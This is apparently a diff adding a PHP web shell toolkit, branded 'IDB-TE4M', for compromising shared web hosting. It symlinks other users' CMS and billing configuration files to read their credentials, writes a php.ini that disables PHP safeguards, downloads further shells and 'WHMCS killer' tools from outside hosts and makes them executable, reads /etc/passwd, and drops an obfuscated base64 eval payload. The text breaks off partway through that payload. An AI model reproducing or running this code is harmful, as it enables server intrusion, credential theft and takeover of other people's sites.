+@symlink('/home/'.$user.'/public_html/Settings.php',$user.'~~>smf'.$type.''); 
+@symlink('/home/'.$user.'/public_html/smf/Settings.php',$user.'~~>smf-smf'.$type.''); 
+@symlink('/home/'.$user.'/public_html/forum/Settings.php',$user.'~~>smf-forum'.$type.''); 
+@symlink('/home/'.$user.'/public_html/forums/Settings.php',$user.'~~>smf-forums'.$type.''); 
+@symlink('/home/'.$user.'/public_html/upload/includes/config.php',$user.'~~>upload'.$type.'');
+@symlink('/home/'.$user.'/public_html/incl/config.php',$user.'~~>malay'.$type.'');
+@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'~~>clents'.$type.'');
+@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'~~>client2'.$type.'');
+@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'~~>client'.$type.'');
+@symlink('/home/'.$user.'/public_html/config/koneksi.php',$user.'~~>lokomedia'.$type.'');
+@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'~~>webconfig'.$type.'');
+@symlink('/home/'.$user.'/public_html/admin/conf.php',$user.'~~>webconfig2'.$type.'');
+@symlink('/home/'.$user.'/public_html/system/sistem.php',$user.'~~>lokomedia1'.$type.''); 
+@symlink('/home/'.$user.'/public_html/sites/default/settings.php',$user.'~~>Drupal'.$type.'');
+@symlink('/home/'.$user.'/public_html/e107_config.php',$user.'~~>e107'.$type.'');
+@symlink('/home/'.$user.'/public_html/datas/config.php',$user.'~~>Seditio'.$type.'');
+@symlink('/home/'.$user.'/public_html/article/config.php',$user.'~~>Nwahy'.$type.''); 
+@symlink('/home/'.$user.'/public_html/connect.php',$user.'~~>PHP-Fusion'.$type.'');
+@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'~~>traidnt1'.$type.'');
+@symlink('/home/'.$user.'/public_html/config.php',$user.'~~>4images'.$type.'');
+@symlink('/home/'.$user.'/public_html/member/configuration.php',$user.'~~>1member'.$type.'') ;
+@symlink('/home/'.$user.'/public_html/requires/config.php',$user.'~~>AM4SS-hosting'.$type.'');
+@symlink('/home/'.$user.'/public_html/supports/includes/iso4217.php',$user.'~~>hostbills-supports'.$type.'');
+@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'~~>hostbills-client'.$type.'');
+@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'~~>hostbills-support'.$type.'');
+@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'~~>hostbills-billing'.$type.'');
+@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'~~>hostbills-billings'.$type.'');
+@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'~~>hostbills-host'.$type.'');
+@symlink('/home/'.$user.'/public_html/hosts/includes/iso4217.php',$user.'~~>hostbills-hosts'.$type.'');
+@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'~~>hostbills-hosting'.$type.'');
+@symlink('/home/'.$user.'/public_html/hostings/includes/iso4217.php',$user.'~~>hostbills-hostings'.$type.'');
+@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'~~>hostbills'.$type.'');
+@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'~~>hostbills-hostbills'.$type.'');
+@symlink('/home/'.$user.'/public_html/hostbill/includes/iso4217.php',$user.'~~>hostbills-hostbill'.$type.'');
+@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'~~>billing'.$type.''); 
+@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'~~>whm-manage'.$type.''); 
+@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'~~>whm-my'.$type.''); 
+@symlink('/home/'.$user.'/public_html/myshop/configuration.php',$user.'~~>whm-myshop'.$type.'');
+@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'~~>sucure-whm'.$type.'');
+@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'~~>sucure-whmcs'.$type.'');
+}
+echo 'Selesai mas/mba bro untuk melihat hasilnya klik ~~> <blink><a href='.$folfig.'>'.$folfig.'</a></blink>';
+}
+}
+?>
+<?php
+if (isset($_GET['idb']) && ($_GET['idb'] == 'auto')) {
+?>
+<form action="?&amp;idb=auto" method="post">
+<?php
+echo "<html><head><title>MATAMU PICEK !!!!</title>";
+echo "<body bgcolor='black'>";
+echo "<center><h1><font color='blue'>IndahNya Berbagi<br/>IDB-TE4M</font></center></head>
+</h1><hr><br/>";
+echo "<font color='yellow'><center>-=[ IDBTE4M ]=- -=[ HGL10]=- -=[ BN ]=-</center></font><br/><br/><form method='POST'>";
+echo "<font size='6' color='blue'><center>MINTA IJIN DULU SAMA SERVER</center></font><br/>";
+echo "<div align='center'>";
+echo "<input type='submit' name='idb' value='IJIN SERVER'><br/> <br/>";
+echo "</div>";
+echo "<font size='5' color='blue'><center>PILIH SALAH SATU VERSI CGI DIBAWAH</center></font><br/>";
+echo "<div align='center'>";
+echo "<input type='submit' name='te4m' value='-=[ HsH ]=-'> ";
+echo "<input type='submit' name='te4m1' value='-=[ AUTO ]=-'> ";
+echo "<input type='submit' name='te4m2' value='-=[ WHM KILL ]=-'> ";
+echo "<input type='submit' name='te4m3' value='-=[ DM SHELL ]=-'> ";
+echo "<input type='submit' name='te4m4' value='-=[ BN CGI ]=-'></p> ";
+echo "<input type='submit' name='te4m5' value='-=[ SABUN ]=-'></p> ";
+echo "<input type='submit' name='te4m6' value='-=[ WHMCS KILL ]=-'></p> ";
+echo "</div>";
+
+
+$sh = 'file_get_contents'; 
+
+if($_POST['idb']) {
+$ini = "php.ini";
+$open = fopen($ini, 'w');
+$source = ("safe_mode = OFF n
+disable_functions = NONE n
+safe_mode_gid = OFF n
+open_basedir = OFF n
+register_globals = ON n
+exec = ON n
+shell_exec = ON n");
+fwrite($open, $source);
+echo "<font color='lime'>";
+if($open) {
+echo '<hr><p>ijin diterima, silahkan pilih tools sesuai keinginan :) </p>';
+}
+else {
+echo "<font color='red'>";
+echo '<hr><p>GAGAL kang </p>';
+echo "</font>";
+fclose($open);
+} } 
+
+if($_POST['te4m']) {
+$cgi = 'http://el-ro.yu.tl/files/in.zip';
+$get11 = $sh($cgi);
+$idbk = fopen('hsh.php', 'w');
+fwrite($idbk,$get11);
+fclose($idbk);
+{
+@chmod('hsh.php',0755);
+}
+echo "<font color='aqua'>";
+echo "<hr>shell hsh sukses dibuat :D <br/>
+Silahkan kunjungi http://alamat-domain-kamu/hsh.php atau lihat hasilnya <a href='hsh.php' target='_blank'>DISINI</a></center></br>"; 
+echo "</font>";
+}
+echo "</font>";
+
+if($_POST['te4m1']) {
+$cgi = 'http://el-ro.yu.tl/files/beiz.zip';
+$get11 = $sh($cgi);
+$idbk = fopen('info.php', 'w');
+fwrite($idbk,$get11);
+fclose($idbk);
+{
+@chmod('info.php',0755);
+}
+echo "<font color='aqua'>";
+echo "<hr>tools sukses dibuat :D <br/>
+Silahkan kunjungi http://alamat-domain-kamu/info.php atau lihat hasilnya <a href='info.php' target='_blank'>DISINI</a></center></br>"; 
+echo "</font>";
+}
+echo "</font>";
+
+if($_POST['te4m2']) {
+$cgi = 'http://el-ro.yu.tl/files/whm.zip';
+$get11 = $sh($cgi);
+$idbk = fopen('whm.php', 'w');
+fwrite($idbk,$get11);
+fclose($idbk);
+{
+@chmod('whm.php',0755);
+}
+echo "<font color='aqua'>";
+echo "<hr>whm killer sukses dibuat :D <br/>
+Silahkan kunjungi http://alamat-domain-kamu/whm.php atau lihat hasilnya <a href='whm.php' target='_blank'>DISINI</a></center></br>"; 
+echo "</font>";
+}
+echo "</font>";
+
+if($_POST['te4m3']) {
+$cgi = 'http://el-ro.yu.tl/files/dm.zip';
+$get11 = $sh($cgi);
+$idbk = fopen('links.php', 'w');
+fwrite($idbk,$get11);
+fclose($idbk);
+{
+@chmod('links.php',0755);
+}
+echo "<font color='aqua'>";
+echo "<hr>shell DM sukses dibuat :D <br/>
+Silahkan kunjungi http://alamat-domain-kamu/links.php atau lihat hasilnya <a href='links.php' target='_blank'>DISINI</a></center></br>"; 
+echo "</font>";
+}
+echo "</font>";
+if($_POST['te4m5']) {
+$cgi = 'http://kefiex.yu.tl/files/sabun.zip';
+$get11 = $sh($cgi);
+$idbk = fopen('sabun.php', 'w');
+fwrite($idbk,$get11);
+fclose($idbk);
+{
+@chmod('sabun.php',0755);
+}
+echo "<font color='aqua'>";
+echo "<hr>sabun massal :D <br/>
+Silahkan kunjungi http://alamat-domain-kamu/sabun.php atau lihat hasilnya <a href='sabun.php' target='_blank'>DISINI</a></center></br>"; 
+echo "</font>";
+}
+echo "</font>";
+if($_POST['te4m6']) {
+$cgi = 'http://kefiex.yu.tl/files/olenk.zip';
+$get11 = $sh($cgi);
+$idbk = fopen('bn.php', 'w');
+fwrite($idbk,$get11);
+fclose($idbk);
+{
+@chmod('bn.php',0755);
+}
+echo "<font color='aqua'>";
+echo "<hr>config kill :D <br/>
+Silahkan kunjungi http://alamat-domain-kamu/bn.php atau lihat hasilnya <a href='bn.php' target='_blank'>DISINI</a></center></br>"; 
+echo "</font>";
+}
+echo "</font>";
+if($_POST['te4m4']) {
+$cgi = 'http://kefiex.yu.tl/files/bn.zip';
+$get11 = $sh($cgi);
+$idb1k = fopen('.pl', 'w');
+fwrite($idb1k,$get11);
+fclose($idb1k);
+{
+@chmod('.pl',0755);
+}
+echo "<font color='aqua'>";
+echo "<hr>CGIProxy sukses dibuat :D <br/>
+Silahkan kunjungi http://alamat-domain-kamu/.pl atau lihat hasilnya <a href='.pl' target='_blank'>DISINI</a></center></br>"; 
+echo "</font>";
+}
+echo "</font>";
+}
+?>
+<?php
+if (isset($_GET['idb']) && ($_GET['idb'] == 'sym2')) { ?>
+<form action="?>&amp;idb=symlink" method="post">
+<?php
+@session_start();
+    @set_time_limit(0);
+    @error_reporting(0);
+    @ini_set('log_errors', 0);
+    @ini_set('error_log', NULL);
+    @ini_set('max_execution_time', 0);
+    if ($win) {
+        echo "<center><br/><br/><nobr><span class='b9'>Symlink Is Not Available In Windows Server</span></nobr><br/><br/></center>";
+    }
+    @mkdir('idb2', 0777);
+    $sempak = "Options Indexes FollowSymLinks\nDirectoryIndex tr.phtml\nAddType txt .php\nAddHandler txt .php";
+    $masuk = @fopen('idb2/.htaccess', 'w');
+    fwrite($masuk, $sempak);
+    @symlink('/', 'idb2/idb.txt');
+    $pg = basename(__FILE__);
+    $etc = file_get_contents("/etc/passwd");
+    $etcz = explode("
+", $etc);
+    if (is_readable("/etc/passwd")) {
+        echo '<center><br/><br/><nobr><b><span class="b7">O=:[ SYMLINK</span> <span class="b8">ETC/PASSWD ]:=O</span></b></nobr><br/><br/> <table align="center" border="3" width="400" cellspacing="0" cellpadding="4">';
+        echo '<tr>
+<td align="center"> <font color="white"> <b>_DOMAINS_</b></td>
+<td align="center"> <font color="white"> <b>_USERS_</b></td>
+<td align="center"> <font color="white"> <b>_SYMLINK_</b></td>';
+        $list = scandir("/var/named");
+        foreach ($etcz as $etz) {
+            $etcc = explode(":", $etz);
+            foreach ($list as $domain) {
+                if (strpos($domain, ".db")) {
+                    $domain = str_replace('.db', '', $domain);
+                    $owner = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
+                    if ($owner['name'] == $etcc[0]) {
+                        $i+= 1;
+                        echo "<tr>
+<td><a class='dm' href='http://" . $domain . " '>" . $domain . "</a></td>
+<td align='center'><font color='white'>" . $owner['name'] . "</font></td>
+<td align='center'><a href='idb2/idb.txt" . $owner['dir'] . "/public_html/' target='_blank'>Symlink</a></td>";
+                    }
+                }
+            }
+        }
+        flush();
+        flush();
+    }
+    echo "</tr></table></div></html>";
+}
+?>
+<?php
+if (isset($_GET['idb']) && ($_GET['idb'] == 'sql')) {
+echo "<center><br/><br/><nobr><b><span class='b7'>O=:[ MYSQL</span> <span class='b8'>MANAGER ]:=O</span></b></nobr><br/><br/> ";
+echo "</br></br><center><b><span class='b11'> You Can Go To : <a href='s/db.php' target='_blank'>[+] HERE [+]</a></center></span></br>";
+if (!is_dir('s')) {
+$mk = @mkdir('s', 0777);
+@fwrite($f, $c);
+$f2 = @fopen('s/db.php', 'w');
+$sml_db = "PD9waHAgZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZU5yTlBXdFhHN21TbjJmT21mK2c5UGltN2NFWW16eXZqWjJRUUdZNFE0QUw1TjZkeFY1djIyNURMM2EzMDkwT01CbisrOVpEcjM2WVFKTGRjK2NCTGFsVUpaV2tVbFdwSkg3NjBZL2pLQjdHL2lLSzB5QThyNzZvZFg3NjhYWGlwOE81ZHg2TWh4K1hVZW9udzNnWnBzSGNyemF4T0JvTms5U0wweW9tS25Nc0VGM2hYeTltMGNTdnVzS3RpM2t3amlPcVVTTWdncGVBWE9Pc05SQnI2cnM1QUtDSlB3MUNxSCt5UFR3K1BEd0ZMRWxLVFp0NVk4anU5eUhIM1lBZmt5QU9QVUE5SEw3YjI5OGREbXUxQnVRam5ZME5oV1R2WlBpdnZRUEdBZjlWajM0N0doNmVBQUxNcllsWG9pWGFvaWxxRmwxZFpXZnZlUGZ0NmVIeEg4T1QzYVB0NDIzNEZOMnV3QmJrNE44ZXZnZjQ4Y3hMa3FGL0hTUnBVblV4YnlXQlg0L2VRb1h6UEh2UEYyUEpxRW1RREtmTGNBeDhRcWp4OUh6NHlZdXJMdVI3bzVsUFpXa1FoVW0rS2REQnZZTjNoNEM5K3NpUC9mT2c2aXd1RmtFNGpaeTZ4bHJMTm96R0dRZGdPQXZtUWNxais5T1AweWoydmZGRjFZdGo3NmJxRG4vZGhjRndoMGVISjZmUU15OFJGUmlWajBzL1NXdmlzd0d2Nkd5R3VmUnZSTGNISDUrODJkSW4wR0FxcWxUd3VYa3JIZ0ZMaDY3T1orNVFVbFlCSGlSRGJvUkNBdTI3aFhLSlhPSG1YUDVQRWhsZmVESDBqc1p0bVU1Zk1wMEwzNXY0Y2RVWlIySHFoK242NmMzQ2I0dlV2MDQzTHRMNXJDTmt0UzVVV1gvcEVEbmh6eEsvZ0hNVW5EOTdJRTZzY2hmSzg5SGxBekZDamJzUXpqeFkwcTBINGd5U2FQM2x5MmQvWDk5MEpMZHgrZnF6S2JIN1pQZjRuN3ZIWnk0dXA1UGQvWGZ1QUNaVWFYYmJ5ajU1ZTd4M2REbzgySDYvNitKS3IrQ2NBNUV3WHdCU2xoSTA4ZVRZVFNLUVJNeGxiM3k1WE14dmtvOHpWengrTEI1VkV1K1Q3eVhUWU1ZVGFqS0NEb1ZRWlhRUkpXbGR3TWN5OFdQNldNQ3FwQThVRnZBaGU4aGxJTzVvdmFXNHFxQVZOTTJHMDFtd3FISWVsY1orc3B3Qk04WEhxblB5MitHL0JCVWx4QmxzNmlNSlVST0xxcnQxc2Rsekc5VFlJWW5WS3NpbHJRM01KV1RZYUd3S29CdDVDWDFXRFk5K096MDlHdjZHUzJ6UWNJZnZiMDcrc2QvQWJtTlZPWGp1V3psNEtRMmV0MWpNZ3JHSDBtQmpHVjZHMFZWWUNyMFRKSXNvQ1JBT0txVXByTlU1NUhlRWFsRFhiZWpHc1VqSFBreTgxSU9tdWk3a1hGMUFNYzZ1SmZUckNuSzVsMU0vSFYrb0ZTbzVvZGR6a0FDekpUUFBaRTBROUFPR3NHZzBZSm5ENTNLK0lOaXFnYTNwaGMzMHhyTW80YmtDd2paVnN4UEp5VW5UN2JxTWwzanhXUTBTVHdHbUN5TXpUODZ4WTBjem1FbStDTUxGTWhVTTR1ckY5RDBtRnhGSHhxcTlRWFo2UnRNMzM1elRDNTlHUk54RVMzSGxoYW5ZZ1Y3TUltOUNVL1FLWkdvWWhZUUpSaS9iMHN4RWhjWHFqMU9CTlllSXNPcmFkR0dLeU9sclppOWdnSG83eDRkSDRuVDd6ZjZ1MkhzbmR2OWo3K1QwUktUenhkQUx6LzBaMXdLd3Q4ZTcyNmU3RWxBWGk2cVVMR0wvOE9EWE4vdUhiOFRCNGFrNCtMQy9YOU5WOXcrM2Q4VE85dWsyQUwzZDNoZXdZY0VHTGx5bjRVMG1DZXlpRjM2T1NRM0hCYWpUd3dLNWQzdTcrenNuNG5UMytQM2VBYlJuUjd6NUE3WVRMaDErTmhMbWR1aEgwK0hRRmJzbmI3ZVBKSndyOXZjT2RoOVNuZnRReG1mVjcya2N6VTBEVlpjdHBtYkxjQnZqdGZSNjlXSXlZaWE2eXMrWGZSaGZuakJURDM1T1JFNzJaQ2NJQXFJeUFEVVhYbnFCbjFsTzMwdk1YSzlMVVlIMXoxellQZnd3Z1FKMzhFMkNoN0Vwb1poQjVteVB4LzRpWGQvM3cvUDBvaTJjQm1oelVMdGFrU0tDcE1INEloSXl3eElPZ3Y3OTZjZFhQUlFTVzdqUDlmQTNZTWJmY3grRXowV2FMdFpCYXdrK2RaMjMxdDdvcUhIdE9pczJYa1NSQnVuTTc3My9BNFQxMWdZbklEZEpiMkJVa0h1eThqaEpFSHdVVFc3cTZlVHpGREMzUld0emNTMjI0OENiMVUrOWkyanVkV2FneTYxZitNSDVCUlkvWDF4M29QRU5razljcDFnRk44anpPRnFHay9iUDArbTBNNHBpNEJyVUJzQWttZ1VUOGZQejU4ODdDMWhmSUI3YlVMOGpDV3h1U3Z3ZWFHOFdlaGk5WlJ6NHNUandyMENaZkIrRlViSUFCZnhyU0NINlVTbytNK2o2T0pwRmNmdm5VUlAvemVCN01zRi9PeEpnU3Y5MFZuUTUxMzVQZk9acTR1ZG1jOXBCZnE5UC9IRVUwNHh0QTNvL1JzWVNiUHNpK3VUSHVzSzAyU3hVUUJuTGZKbWxMUUdqSlJ1ZlJvdTIxVlhEZ2ZWUmxLYlIzQzZjVENaWmRyWHdYODJhWndEWmFzS1BaL3kvSXJmNXZjajlIZis5bTl3MEdpK1Q3MFVQL3ZHOHUrbmhvdnRPNVB5LzQ3K3J5ZUc4V2IvaVdUS0taaE9idm9DNUhINjJJY0lvbm5zemhBRTdadjU1N3NYblFkaHVhdlJOTExyWUxDdFFNL0VwRUxYWExtVVFqU1Q0MDIrM01DbW45ck0zejE4K2Y0Y29sN01HeWVOWllGQkxvS2RQbnhieDJkOVkvWE4rNHBKMm9GQzhlUEdpTXdVTklHM1AvR25hQWZzUHJPaWI5bWdXalM4N1Y4RUVSR25yR1RDdHc3VFhZMEtPYkVUa1d4c2t3a2lXamVOZ2tkckM3SCs4VHg3bm9reFQ5cWg0ZStHUEw3ZG5zeXF5VWRtRlZiQmRSZEJ0ZG9JdHpHN0Fqb2s3UU5LWWtUanZCR3RyQklwZ3FCZG5nTTZDZ2R6Ly9BYnB6V2d3amk4dXZSbG94U0RsRzJNa0NSdWZyTWRGS3BjM0FLdUJsV293SVdLeG55N2pVRXhnQlNDZEJ0alp1MHp5emMzZUJLRjRlOVkxenlPUFBxcndDM1dsU3RWVldXNnR3UjhOTWtTN2tPamtBWkxsQ0kxcmlSVjRTOHhENW02b3JRaDNCa0U4N3pwNk5wQTJ2QTdERmkzVDlqUzRoajZKSzFnazZ5T1EySmR0K3JrT1BlYWRpSlZFSE5tdTAybzIvK1lJWGxCZHB3bDdtVCtieVhtcjB5alZaWm9ReE96SDZEb28rRGhyMHR2QzlhSmF4aE9LcGtySDZaMTRVeCsyaDRuZjNucTF1RmdJMm9TQmwrUHBlZFZOb0hBNGgwSlFOMS8xb00rQUJsSENoaHY3MDY1akpsRmJjOWVkUmVmUVZWUlFlL3YwdWJYaDljU1hhb0VLNDAzbVFVajFWSTBOYlB0R0d1TVA1QXhyQUE5Z1V1dFprVXRiaUMrbEFjTWVTMWZKSEFkUitVcElmK24yck9ISFlaOTdsLzVGZ0w0eGxkdmhxdE1vU3FYdHkzb2VsNHUvL2hMcUU4MWcwMFdjdjQra1FZSUdzZnBFYXo4YWV6Tk1vR253U05vcUVvWStwUzMzU0Zvb3NvZytvZWpKaytaemx6eFFJMndaWm0yeGFjUnJIOW8vOFVOSEJKTXVPaEZDVUgwZFFVcWNTZklhY0ZxTzJPaTVzbGZLRHVTRzFtajlTQkpnK0RrMmpiNGswaWNxZlllcjlDVVpLODEwK2s1RjUyejArcUZEUzk2bWlOMldkdGE5U1dJZG02Uk1XeVJsVGpsSnRBc2ZTaExyMkNSbDJpSXBjMWFRUkhQem9TU2hUb1lrcDIyU25GTk9rc3pwQjVMRU9qWkptYlpJeXB3eWtsTHhmaGhOV2NrUU5SbWFxc25TWkhIZS92QkZWMVRlRThYcmwxMUhtSjVYbFlNQjVHSUV2MUt3NzZuWXJkM2xaVkJPQnVWalVDNEc3V0c0di9kcWl1NjExOU5vZ2VZU1duMTE5OHBWTmlXVTF2S3VBOWZ5Y2JsZjVlUDZmL0FjcmZBVjFRWDJTRHVNcHV3cmtubGtaUzdqR1hxVXJUTUZlZEpRZDkwNjhZZGtkZFhkZ2Zhak1Tb3V2RVFrU3pCQWswVHcrSXMwRW5vN2t0WXI0RzI0RHJBdGh0MnY2d3hITXk4RTh4QktFU2V5eDJQdTVKMVlaZzRBMFRlTW4yMTV0MmE3dEdtNGdoQm1CUXR0L2dSY1BJQ1gvZzEwQ3Qyek1LdmxWMHF1VlJvQjdaN1gxY2c5cjd6elVNZTQ1bFZDNFd3d3FnYW1rWTJTZ01wMmNwNGJySTZaTkRXNUJYVzNrK21HUkl6ZFlHUzFiMXdEOCtySHFyTjNjTEo3Zk1xZUlwNDNwREFxY2pYeHorMzlEN3NuM0VQTWNQQWd4TjFqbm9iK2xZaFJrWjZJYUtvRzNCVnRrWm5udFd4SGxndVk1bjUyUENpRk0rZjVVMmJqdHd4SW50a0kwSEM2OTJlNUdsSEY1TXJWaFI4cjcvUHpwME8wSFVBblVRM3VmUHN3ZkRqYVFkZWdOUUludTZkNld2N3J0OTFqS09SVzdPKzkzenNWTFI2SFkyWStzUlRrN1pkWWI0VHl4SmZDMkdiNkY3dFpnV3ArNmcrUjg3Q0Y3T3p1NzBLcjN4MGZ2cmViYmpmWCtRN011UThaNHNZT3RnNVZ2M3ZQU2NrWGc1UlVPOE9sT0ZxNDM3ck9rRUxXbjJub09UVzE1ZTBBS2Q1QTdHYWJ2VXFlZjdodVR2eXRHRzZvSnB1U3FGMnU2cUordmVOUFBkZ3pZSzdqcVJsay9Qcm1kendlcG1NNVNMN0IzM1Y1OUFmcEQ2ZnYxbDlpaGp3VGc2eDllVHJXS2RQanlaZUhVT1RiRSsrOTBEdjM0eFhhZk4yMlFYNzZFYmZKTVZpVFBsZ0xpNTdLMm5ramZrTk52ZTBxSEtTNTVBMEhIaGxFR2Z5Skdadk51a3ZLQ254ckhWb1N5U0QvZ0NyK0Y1SGpjSzlFenVweUdmSWptQjFmUm81emFDVnlWb3l6eUZmaWtoYUZhekNnVTFsbW9hNkhPV3hYUXdiWnJaZ3pTbDFOWW1NQnRwOGNocUs5OWVwQnZnMS9FcVM4R0tzODVIVXBYT3BDejJwMTJtU1piU2lkakc0SWZab0dNYXlSdlVSRXNRaVNzTyttWXBKZDdLK2dBNElkRlBLTW9PcHl5U3lBYVZGcjBLbzJ6Z2FvMlNrQ2NlTWtGQ2RLb0hUVEphQk9sOEJtZlJpYU1XRGhzOGlvV2tkc2VMS2trcm9yZ0JCV3NUeGxnMjZNTE1LY0tBS3RJQW9nclB6cEJ0ZUpLL1VGckZIZEFqTXdwaEU0RGdUS0d3VlJreXA1aHJIMGJUWlJqVGRiQTdObEJmelU0MldCZklIRkZ1UnFKOUdYWEEzMk9HWEZFM1hEdlkvSU11VThXM0tadXRsU0pFZ0RyTVNMc2JxWjFzRGVUNGhhUkFxbnVGWWZSN3BkdHc5cmplVDhneHV6aWkwbUgyY0RXUlRuL3FvQnlUVzBNZ2FGMEdmRFMyOTB0R3Npa25DSjdwZ25UWldHUkJDbU1LT3FtZ2FlZ0p0cFN0RldITk1Ec0Z3aTFrV3JKbjRSQ21QMmVEQmJ3NmJVTXVzZzY4bEJKU1ByYWNua2tMeTNjcVJJcjMyZnNBM1NGejZSVTR0VkJ3eVdBZ3lRTmFTelRiUFRVQ2lGQUd0TTFXbTRJbDZHSVdwSFFZZ0YzQXJJQmpXY2t0aVdodnZhS3NMdGhOV1lpK0Q4Z2dtYlJ2U0UrN1RSY2xWc0ZRL3B4NlVmMzFpaEkzanUvV2I3WlBlRVQ1SW5vOXhJUThiWkFIV2o5WFZ4d2tmTG5wZ29VM1I5WFZ2VHlMWnlRNXBJYWg5SmNnWS96clExNnc0UWV5NkxCeGRuS0o5bUYvUWY2Y05JOGcxcXd4b3hPLy9aQUpMUmd0WU83ZllKckNDcUFyWXNaZEJndWxFSW94bWVVeTJ6ZDZRWFFkTGcyc2taSlZUZHZYRGlYdzlZZU5hUW9uK0ZCeU5RdlZVelNpV3h3M0NTYlFRakxMTGF6TnRsSE9OeC9RUzZRUjBSWmU1bDA3aStTOU9BaExqYkp5ZXpsYUZ0KzZ3Q3J1aUt2NFNpZDRwbDVjVDBoa2Eweko1aHlGbDU1T0UrZXlpZXV1aTdiRzR5VHJaOENkZGZYNE1MN0xubEdIWlZuOUhoaFBwNlpHaWZTRHp3UlhnR1NxSkxWYzd5bi9EY0dFNUdlcEI1dllFRUFMSEdOaDNaRnhWWTVXb1JOdFVRSVFaZUp1ejhNaUJTMEZXODJTeTZRbzNQcnBZeHJSN2xzZWdrbXBNbllPZTlQUVZKbTdQMHlFUzNHMm1xZFhJNFRLTGhTRXZabHRCMUxjUUpwOTNnbHVFYXVVaDVQeU5YRmNid29aOXE3cWNYMGFUcllEaW5vNWNGckpEczhjaG1zL21nSXlSNU9DTEdFV1lEeVUybmQ3d01CUXBmNnNvRy9neGdmd01WVG9zMWF5bTFyVU1iZWRDeWhVbzV4aWZJZ3diTkZrZWZWVUdobzg2bitGenplYk5wamt2cGpCUFAvS2ZBbzdhM1RDTmFVQmpOa1N6OGNlRE5hSHV4NWtWOTkrQjArSThQaDZlN0orVGFWRTNvY2ZQd0NKbXA2WE5nT25RR0JyQW5XalpzbE9wbTJVMVJSeWFzN2puUzlsQXBlWDd5RCs3aVJxOTRqR1hXUW9rV1VyZG0yNFBWR2xwb21DaVRaM2dnVlRXTGhkemZlZ2tZOTZGeE9XajU0QmFjekx3YnZqM2MvL0QrNEtTd1NEaktLcnJLeVhTNThkM0xoY3pWYVMvRlQ3TWllSDZ2bXROUGluTmFMdzV6T0lyS3BGMHc2YjBML05tRVJzck94UmlpUXViQmNqWXJaUDd1M3hUeXBIdWprTDk3bmNaZU5oZG5oMUlwMGEwb3FwSjk2RlBVWVdPNHE0NHdiR3gwWGkxMkNvVXlBYUI4aU1KNUJBb1FMaHF3aW5FM0pxZ0RPa0p4S1c2azczWU0zREl0QWJNd0luQ21FMUNHTG51WEdJZlJyb1Z1S2doazRwMEF5RkFFZUJ5T2trVm5KUml3K0I1UXlxZjBaVWdhaGxWd2VrQmcxcVVqcmVSYk1kcG1tZkNXN05KNXI4bEZXZTZ1T0p6SnJCdDdNNjFaaHkxZnYwd3FjVktpUytYYnE5V3FpODJlNVVOSDFVeXExTlllTDkyQmoyUHY0ekxxbUxNaVkzMUlUQi9Zb3k2OW52ZkdjdzkvYjBiNnJOaWVWN2luTzRvbmR3WnAybHV1Mmw4WFlEZzRKUnR3N3k2VDhrdm11U1hzczBQLzlmTHRMcmxCd3grRElXRXYySUUrbnFBckdzVzl0RmdoYTJ5cW1xNDhxUGkza2s1Ym96SUJOWUw4R0tNYXlpUlRWbFhKYUNhODIrdURuck1DNmtGT2UzbG1heS9QeTdVWFptQ0pjbUtMbmkrc1hKdTl5SFdjbUhuMXJhalJaTlVWdTNOYWVkbVR5WTFDbXpMci9mdlI1NE00VGYrRFRCYm9GM3hjZFdISkNHVnFLRFhMYUVMV3hDVjlCNFhCYTMzWnJRTUwwYWhDOXVtZUJNYmxCSm82R01IR1lLQ3hNY2xGMVVIMWU5UWp4ZS9uendoL0t6RFd1YmkyaWpxcVE3TVQ5RUlTVnNsVkFCS3ErdEY0QTM3NkVVaU1VZGx1dHJXczNjV1RGaUJ4eDFrK3haZDFaTlZXbTFzTmVsMGFvYmtSVjJFVThHS2RiRkd6M25vQyt3cnBmdXdyK0lVaTR1VStWbUtqRUJPMFBTVFZGQSt3YTJFTEpVTllMVW4xb3czSS9oOFF2SUgwVU5GM2xlc2EwMGgrNVhYaTIweWtocmtXZ3ZSby84cEdDTENrZC9xeFV4ZE9QNlNmcVZPcnE3TW92T3VvZmtCdUdnZno2b3BCcThtYmtJYlFJdmJQTlNWbm83L1IvK1hzdjZyOVgvb2J0Y0V2K0dzalFJSUNmdWhxSkttdzN0eWpuV2cyZzVySTZINnk5dCtmWVJSdXEyZjlxOEZhalJPUWkwaDA5WHFGNnZsSjRVaE9GWnkxQmh4RmY1dmRPQ3Q2aHNQV3Bkbi9iVnZQU3RXYTVvYWVNeHg1QW90NW0zWkhvMjVWcGloRzJUMzYyc3daeWszcy9SbERVU3NZaDFvSnRuUWxTS3l0VVR5YVpJRzZpSUhsUTc2ZXhTaUEvd0V6RE9SUEhoRHpDb0RBMWp3Y1gxcklnT0hDQjVrWFJsZXh0K2hSTTJDYjRhRExYb1VSUTdXYWpKK2tqanNaYVNWbG16U1A1bUhoT2ttU1JHT2o5LzNibUFKYWFaTkJDNVZScXhBZUFiMlJjUkVnUEdHWEFkbXREdGxVMGpydnZ6dE1Rc0xuSWlYRTlzR09VRW9JdEtDQlFZOW1RTmhQTUJ6UGZDODBLREpLdjZ5YlUwSDlrRlZReWw0OW54V2RNcGVaZGVUWUo0T0FYV1hBVEVLcVhHZGwvc0pkZ0w3REdaZkJQUEZuOTBlODQ4OFFyMjN1QU5jS2RzOHlKSWMvbDJTTm9Mem95T3d4bTIzY0tJeEwzNXRPeVFuTWU0QWlBOXVUS2hCWUFKc1lxMnhlTEJXMX